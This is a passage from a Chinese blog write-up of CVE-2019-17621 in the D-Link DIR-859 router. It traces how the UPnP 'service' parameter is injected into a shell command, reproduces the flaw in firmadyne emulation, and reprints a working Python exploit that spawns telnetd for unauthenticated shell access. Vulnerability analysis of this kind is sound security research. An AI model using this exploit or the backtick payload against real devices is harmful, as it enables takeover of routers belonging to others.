<span class="token comment" spellcheck="true">/* IGD services */</span>
<span class="token keyword">if</span>        <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"L3Forwarding1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.Layer3Forwarding.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"OSInfo1"</span><span class="token punctuation">)</span>            <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.OSInfo.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANCommonIFC1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANCommonInterfaceConfig.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANEthLinkC1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANEthernetLinkConfig.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANIPConn1"</span><span class="token punctuation">)</span>        <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANIPConnection.1.php"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* WFA services */</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WFAWLANConfig1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WFAWLANConfig.1.php"</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$METHOD</span> <span class="token operator">==</span> <span class="token string">"SUBSCRIBE"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SID</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$HOST</span><span class="token punctuation">,</span> <span class="token variable">$REMOTE</span><span class="token punctuation">,</span> <span class="token variable">$URI</span><span class="token punctuation">,</span> <span class="token variable">$TIMEOUT</span><span class="token punctuation">,</span> <span class="token variable">$SHELL_FILE</span><span class="token punctuation">,</span> <span class="token string">"/htdocs/upnp/"</span><span class="token punctuation">.</span><span class="token variable">$php</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">GENA_subscribe_sid</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$SID</span><span class="token punctuation">,</span>  <span class="token variable">$TIMEOUT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$METHOD</span> <span class="token operator">==</span> <span class="token string">"UNSUBSCRIBE"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">GENA_unsubscribe</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$SID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>可以看到当请求方式为SUBSCRIBE的时候才会进一步处理，该脚本中<code>GENA_subscribe_new()</code>处理了变量<code>$SHELL_FILE</code></p>
<pre class=" language-php"><code class="language-php"><span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$HOST</span><span class="token punctuation">,</span> <span class="token variable">$REMOTE</span><span class="token punctuation">,</span> <span class="token variable">$URI</span><span class="token punctuation">,</span> <span class="token variable">$TIMEOUT</span><span class="token punctuation">,</span> <span class="token variable">$SHELL_FILE</span><span class="token punctuation">,</span> <span class="token string">"/htdocs/upnp/"</span><span class="token punctuation">.</span><span class="token variable">$php</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>使用命令<code>grep -nr "GENA_subscribe_new"</code>搜索<code>GENA_subscribe_new()</code>发现其定义在upnpinc/gena.php脚本中。 </p>
<p>文件：gena.php，<code>GENA_notify_init()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$node_base</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$remote</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">anchor</span><span class="token punctuation">(</span><span class="token variable">$node_base</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"subscription#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$found</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* find subscription index &amp; uuid */</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token string">"subscription"</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"host"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token variable">$host</span> <span class="token operator">&amp;&amp;</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"uri"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token variable">$uri</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span><span class="token variable">$found</span> <span class="token operator">=</span> <span class="token variable">$InDeX</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$found</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$index</span> <span class="token operator">=</span> <span class="token variable">$count</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$new_uuid</span> <span class="token operator">=</span> <span class="token string">"uuid:"</span><span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/genuuid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$index</span> <span class="token operator">=</span> <span class="token variable">$found</span><span class="token punctuation">;</span>
        <span class="token variable">$new_uuid</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uuid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/* get timeout */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$timeout</span><span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> <span class="token variable">$timeout</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$timeout</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$new_timeout</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token variable">$new_timeout</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/device/uptime"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$timeout</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">/* set to nodes */</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/remote"</span><span class="token punctuation">,</span>    <span class="token variable">$remote</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uuid"</span><span class="token punctuation">,</span>        <span class="token variable">$new_uuid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/host"</span><span class="token punctuation">,</span>        <span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uri"</span><span class="token punctuation">,</span>        <span class="token variable">$uri</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/timeout"</span><span class="token punctuation">,</span>    <span class="token variable">$new_timeout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/seq"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">GENA_subscribe_http_resp</span><span class="token punctuation">(</span><span class="token variable">$new_uuid</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">GENA_notify_init</span><span class="token punctuation">(</span><span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$new_uuid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>其中<code>GENA_subscribe_http_resp($new_uuid, $timeout)</code>是加载对订阅事件的应答报文头部。并没有处理<code>$shell_file</code></p>
<p>文件：gena.php，<code>GENA_subscribe_http_resp()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_subscribe_http_resp</span><span class="token punctuation">(</span><span class="token variable">$sid</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">/* Generate HTTP header */</span>
    <span class="token keyword">echo</span> <span class="token string">"HTTP/1.1 200 OK\r\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"SID: "</span><span class="token punctuation">.</span><span class="token variable">$sid</span><span class="token punctuation">.</span><span class="token string">"\r\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"TIMEOUT: "</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$timeout</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string">"Second-infinite"</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">echo</span> <span class="token string">"Second-"</span><span class="token punctuation">.</span><span class="token variable">$timeout</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"\r\n\r\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>继续跟踪<code>$shell_file</code>，发现真正处理<code>$shell_file</code>的<code>GENA_notify_init()</code>函数。</p>
<p>文件：gena.php，<code>GENA_notify_init()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_notify_init</span><span class="token punctuation">(</span><span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$sid</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    <span class="token variable">$inf_path</span> <span class="token operator">=</span> <span class="token function">XNODE_getpathbytarget</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"inf"</span><span class="token punctuation">,</span> <span class="token string">"uid"</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$inf_path</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">TRACE_debug</span><span class="token punctuation">(</span><span class="token string">"can't find inf_path by $inf_uid="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span><span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$phyinf</span> <span class="token operator">=</span> <span class="token function">PHYINF_getifname</span><span class="token punctuation">(</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$inf_path</span><span class="token punctuation">.</span><span class="token string">"/phyinf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$phyinf</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">TRACE_debug</span><span class="token punctuation">(</span><span class="token string">"can't get phyinf by $inf_uid="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span><span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$upnpmsg</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/upnpmsg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$upnpmsg</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token variable">$upnpmsg</span> <span class="token operator">=</span> <span class="token string">"/dev/null"</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span>
        <span class="token string">"#!/bin/sh\n"</span><span class="token punctuation">.</span>
        <span class="token string">'echo "[$0] ..." > '</span><span class="token punctuation">.</span><span class="token variable">$upnpmsg</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"xmldbc -P "</span><span class="token punctuation">.</span><span class="token variable">$target_php</span><span class="token punctuation">.</span>
            <span class="token string">" -V INF_UID="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_URL="</span><span class="token punctuation">.</span><span class="token variable">$uri</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_HOST="</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_SID="</span><span class="token punctuation">.</span><span class="token variable">$sid</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_SEQ=0"</span><span class="token punctuation">.</span>
            <span class="token string">" | httpc -i "</span><span class="token punctuation">.</span><span class="token variable">$phyinf</span><span class="token punctuation">.</span><span class="token string">" -d \""</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">.</span><span class="token string">"\" -p TCP > "</span><span class="token punctuation">.</span><span class="token variable">$upnpmsg</span><span class="token punctuation">.</span><span class="token string">"\n"</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token string">"rm -f "</span><span class="token punctuation">.</span><span class="token variable">$shell_file</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现了<code>$shell_file</code>最后结束的地方，该函数两次调用<code>fwrite()</code>，在网上查阅了正常PHP函数<code>fwrite()</code>用法是结合<code>fopen()</code>来创建文件，这里的<code>fwrite()</code>可能重新定义了。第一次调用<code>fwrite()</code>，是新建一个名为<code>$shell_file</code>的文件。这没什么问题。</p>
<p>可以回溯之前提到的<code>sprintf()</code>，里面的SHELL_FILE变量是可以被我们控制的。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class=" language-php"><code class="language-php">如果<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=file_name"</span>
新建的文件完整路径应该是：<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>file_name_pid<span class="token punctuation">.</span>sh</code></pre>
<p>问题出现在第二次调用<code>fwrite()</code>是向这个文件加入一行<code>"rm -f ".$shell_file."\n"</code>，目的是为了删除新建的文件。问题就出现在这个地方。</p>
<pre class=" language-php"><code class="language-php">如果<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=`telnetd -p 1234`"</span>
新建的文件完整路径应该是：<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>`telnetd <span class="token operator">-</span>p <span class="token number">1234</span>`_pid<span class="token punctuation">.</span>sh    
系统运行命令 rm <span class="token operator">-</span>rf <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>`telnetd <span class="token operator">-</span>p <span class="token number">1234</span>`_pid<span class="token punctuation">.</span>sh</code></pre>
<p>如果rm 命令遇到反引号，rm命令将会运行失败，并且继续执行反引号里面的命令。所以只要控制好SHELL_FILE变量就能触发漏洞。</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>利用FIRMADYNE全仿真系统模拟路由器固件运行，可以自己参照firmadyne使用步骤写利用脚本，也可以利用知世师傅写的<a href="https://github.com/nightRainy/Auxiliary_tools/blob/master/iot/fastrun.py" target="_blank" rel="noopener">脚本</a>或者利用firmadyne的自动化利用工具 <a href="https://github.com/attify/firmware-analysis-toolkit" target="_blank" rel="noopener">firmware-analysis-toolkit</a> 中的./fat.py将固件模拟运行起来。</p>
<p><img src="dir859.png" alt=""></p>
<p>随后利用nmap进行扫描firmadynew为路由器配置的默认IP地址<code>192.168.0.1</code>发现，该主机确实存活并且开启了4个端口(53DNS端口、80HTTP端口、443HTTPS端口、49152应该是upnp端口)</p>
<p><img src="nmap.png" alt=""></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>这是研究员Miguel Mendez Z.的<a href="https://github.com/s1kr10s/D-Link-DIR-859-RCE/blob/master/reverseshell-SUBSCRIBE.py" target="_blank" rel="noopener">EXP</a>脚本。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> os
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">def</span> <span class="token function">httpSUB</span><span class="token punctuation">(</span>server<span class="token punctuation">,</span> port<span class="token punctuation">,</span> shell_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n[*] Connection {host}:{port}'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token operator">=</span>server<span class="token punctuation">,</span> port<span class="token operator">=</span>port<span class="token punctuation">)</span>
    con <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    request <span class="token operator">=</span> <span class="token string">"SUBSCRIBE /gena.cgi?service="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>shell_file<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" HTTP/1.0\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Host: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>server<span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Callback: &lt;http://192.168.0.4:34033/ServiceProxy27>\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"NT: upnp:event\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Timeout: Second-1800\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Accept-Encoding: gzip, deflate\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"</span>

    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Sending Payload'</span><span class="token punctuation">)</span>
    con<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>server<span class="token punctuation">)</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>request<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    results <span class="token operator">=</span> con<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>

    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Running Telnetd Service'</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Opening Telnet Connection\n'</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'telnet '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>server<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' 9999'</span><span class="token punctuation">)</span>

serverInput <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">'IP Router: '</span><span class="token punctuation">)</span>
portInput <span class="token operator">=</span> <span class="token number">49152</span> <span class="token comment" spellcheck="true">#upnp端口</span>

httpSUB<span class="token punctuation">(</span>serverInput<span class="token punctuation">,</span> portInput<span class="token punctuation">,</span> <span class="token string">'`telnetd -p 9999 `'</span><span class="token punctuation">)</span></code></pre>
<p>运行EXP结果如下：</p>
<p><img src="poc.png" alt=""></p>
<p>nmap扫描发现确实打开了9999端口，并能够在未授权的情况下获取路由器的shell。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104" target="_blank" rel="noopener">https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104</a></p>
<p><a href="https://nightrainy.github.io/2020/02/25/DIR-859-RCE分析-CVE-2019–17621复现/" target="_blank" rel="noopener">https://nightrainy.github.io/2020/02/25/DIR-859-RCE%E5%88%86%E6%9E%90-CVE-2019%E2%80%9317621%E5%A4%8D%E7%8E%B0/</a> </p>
<p><a href="https://www.ibm.com/developerworks/cn/linux/other/UPnP/part1/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/other/UPnP/part1/index.html</a> </p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>d-link</tag>
        <tag>dir-859</tag>
      </tags>
  </entry>
</search>
